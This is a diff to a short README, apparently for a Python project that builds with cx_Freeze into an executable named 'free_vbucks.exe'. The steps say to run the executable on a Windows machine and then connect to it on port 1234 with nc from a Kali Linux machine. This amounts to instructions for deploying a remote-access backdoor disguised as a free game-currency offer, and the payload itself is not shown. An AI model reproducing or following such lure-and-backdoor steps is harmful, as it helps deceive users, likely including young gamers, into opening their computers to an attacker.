@@ -4,6 +4,8 @@ Have Python and cx_Freeze installed
 How to install cx_Freeze:
 run "pip install cx_Freeze" in your terminal
 
+How it works:
+
 1. Open your code editor (or cmd) and run "python setup.py build" in the terminal
 2. Open the folder inside the "Build" folder and run the "free_vbucks.exe" in your Windows system
 3. Try "nc [your-windows-IP] 1234" on another machine (i.e. Kali Linux)
